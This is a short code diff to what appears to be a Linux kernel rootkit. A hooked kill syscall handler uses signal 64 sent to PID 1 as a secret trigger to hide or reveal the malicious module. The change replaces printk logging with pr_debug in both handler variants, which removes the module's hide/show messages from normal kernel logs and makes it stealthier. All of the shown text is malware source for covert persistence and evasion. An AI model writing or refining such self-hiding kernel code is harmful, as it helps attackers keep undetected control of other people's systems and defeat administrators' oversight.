@@ -13,11 +13,11 @@ static asmlinkage long hack_kill(const struct pt_regs *regs){ // pretty self exp
     if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            printk(KERN_INFO "Hide rootkite\n");
+            pr_debug("Hide rootkite\n");
             hide_mod();
         }
         else{
-            printk(KERN_INFO "Show rootkite\n");
+            pr_debug("Show rootkite\n");
             show_mod();
         }
     }
@@ -32,11 +32,11 @@ static asmlinkage long hack_kill(pid_t pid, int sig){
     if ((sig == 64) && (pid == 1))
     {
         if(hidden == 0){
-            printk(KERN_INFO "Hide rootkite\n");
+            pr_debug("Hide rootkite\n");
             hide_mod();
         }
         else{
-            printk(KERN_INFO "Show rootkite\n");
+            pr_debug("Show rootkite\n");
             show_mod();
         }
     }
